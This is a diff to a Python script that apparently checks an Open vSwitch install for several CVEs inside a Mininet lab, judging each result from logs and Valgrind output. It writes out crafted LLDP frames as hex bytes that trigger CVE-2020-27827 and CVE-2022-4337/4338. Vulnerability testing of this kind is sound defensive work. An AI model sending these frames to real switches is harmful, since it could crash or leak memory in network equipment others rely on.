@@ -12,7 +12,6 @@ from mininet_setup import MininetNetwork
 def cve_2016_2074():
     setLogLevel('info')
 
-    ovs_config.set_log_path('cve_2016_2074')
 
     mininet = MininetNetwork()
     mininet.mininet_1h_1s()
@@ -29,7 +28,6 @@ def cve_2016_2074():
         vulnerable = True
 
     mininet.cleanup_network()
-    ovs_config.reset_log_path()
 
     return vulnerable
 
@@ -43,12 +41,8 @@ def cve_2016_10377():
     mininet = MininetNetwork()
     mininet.mininet_2h_1s()
 
-    #mininet.net['h2'].cmd('sudo wireshark -i h2-eth0 -k &')
-    #sleep(5)
     mininet.net['h1'].cmd('./packets/cve_2016_10377')
-    #sleep(10)
-
-    #mininet.net['h2'].cmd('sudo killall wireshark')
+    
     mininet.stop_mininet()
 
     vulnerable = False
@@ -76,18 +70,14 @@ def cve_2017_9264():
     mininet = MininetNetwork()
     mininet.mininet_2h_1s()
 
-    #mininet.net['h2'].cmd('sudo wireshark -i h2-eth0 -k &')
-    #sleep(5)
     mininet.net['h1'].cmd('./packets/cve_2017_9264')
-    #sleep(10)
 
-    #mininet.net['h2'].cmd('sudo killall wireshark')
     mininet.stop_mininet()
     
     vulnerable = False
     with open(log_path, 'r') as log_file:
         log_content = log_file.read()
-        error = re.compile(r'failed to put\[create\] \(Invalid argument\)')
+        error = re.compile(r'eth\(src=00:00:00:00:00:01,dst=00:00:00:00:00:02\),eth_type\(0x86dd\)')
         if error.search(log_content):
             vulnerable = True
 
@@ -102,16 +92,36 @@ def cve_2017_9264():
 def cve_2020_27827():
     setLogLevel('info')
 
+    log_path = ovs_config.start_valgrind('cve_2020_27827')
+
     mininet = MininetNetwork()
     mininet.mininet_1h_1s()
 
     os.system('sudo ovs-vsctl set interface s1-eth1 lldp:enable=true')
     os.system('sudo ovs-vsctl set interface s1 lldp:enable=true')
 
+    sequence = "04 08 05 73 31 2d 65 74 68 32 "
+    repeated_sequence = sequence * 100
+
+    command = ('python3 packets/sendpkt.py h1-eth0 01 80 c2 00 00 0e 2e f5 6d a9 92 b0 88 cc 02 07 '
+               '04 2e f5 6d a9 92 b0 04 08 05 73 31 2d 65 74 68 31 ' + repeated_sequence +
+               '06 02 00 78 0c 12 6f 70 65 6e 76 73 77 69 74 63 68 20 32 2e 31 37 2e 38 '
+               '0e 04 00 04 00 04 fe 32 00 04 0d 0b 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 00 00 00 2e f5 6d a9 92 b0 00 00 00 00 00 00')
+    
+    mininet.net['h1'].cmd(command)
+
     mininet.stop_mininet()
     mininet.cleanup_network()
 
     vulnerable = False
+    with open(log_path, 'r') as log_file:
+        log_content = log_file.read()
+        error = re.compile(r'definitely lost: 210 bytes in 3 blocks')
+        if error.search(log_content):
+            vulnerable = True
+
+    ovs_config.valgrind_cleanup()
+
     return vulnerable
 
 # Test for CVE-2020-35498
@@ -125,8 +135,6 @@ def cve_2020_35498():
     mininet.net['s1'].cmd('sudo ovs-ofctl add-flow s1 priority=10,ip,ip_dst=10.0.0.1,actions=1')
     mininet.net['s1'].cmd('sudo ovs-ofctl add-flow s1 priority=10,ip,ip_dst=10.0.0.2,actions=2')
     mininet.net['s1'].cmd('sudo ovs-ofctl add-flow s1 priority=0,actions=drop')
-    #mininet.net['h1'].cmd('arp -s 10.0.0.2 00:00:00:00:00:02')
-    #mininet.net['h2'].cmd('mininet.net['s1'].cmd('arp -s 10.0.0.1 00:00:00:00:00:01')
 
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     cve_pcap_filename = "logs/cve_2020_35498_{}.pcap".format(timestamp)
@@ -193,10 +201,6 @@ def cve_2022_4337():
     os.system('sudo ovs-vsctl set interface s1-eth1 lldp:enable=true')
     os.system('sudo ovs-vsctl set interface s1 lldp:enable=true')
 
-    #mininet.net['s1'].cmd('sudo wireshark -i s1-eth1 -k &')
-
-    #sleep(10)
-
     mininet.net['h1'].cmd('python3 packets/sendpkt.py h1-eth0 01 80 c2 00 00 0e 00 00 00 00 00 01 88 cc 02 07 04 00 00 00 00 00 01 04 03 05 76 32 06 02 00 78 0c 50 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 fe 05 00 04 0d 0c 01 00 00')
 
     mininet.stop_mininet()
@@ -226,13 +230,8 @@ def cve_2022_4338():
     os.system('sudo ovs-vsctl set interface s1-eth1 lldp:enable=true')
     os.system('sudo ovs-vsctl set interface s1 lldp:enable=true')
 
-    #mininet.net['s1'].cmd('sudo wireshark -i s1-eth1 -k &')
-
-    #sleep(10)
-
     mininet.net['h1'].cmd('python3 packets/sendpkt.py h1-eth0 01 80 c2 00 00 0e 00 00 00 00 00 01 88 cc 02 07 04 00 00 00 00 00 01 04 03 05 76 32 06 02 00 78 0c 50 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 fe 05 00 04 0d 0c 01 00 00')
 
-    #CLI(mininet.net)
 
     mininet.stop_mininet()
 
@@ -292,12 +291,7 @@ def cve_2023_1668():
     mininet.net['s1'].cmd('sudo ovs-ofctl add-flow s1 priority=82,ip,nw_dst=10.0.0.2,"actions=set_field:0x40->nw_tos,output:2"')
     mininet.net['s1'].cmd('sudo ovs-ofctl add-flow s1 priority=0,actions=drop')   
 
-    #mininet.net['h2'].cmd('sudo wireshark -i h2-eth0 -k &')
-    #sleep(5)
     mininet.net['h1'].cmd('./packets/cve_2023_1668')
-    #sleep(10)
-
-    #mininet.net['h2'].cmd('sudo killall wireshark')
 
     flows = 'sudo ovs-appctl dpctl/dump-flows'
     process = subprocess.Popen(flows, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
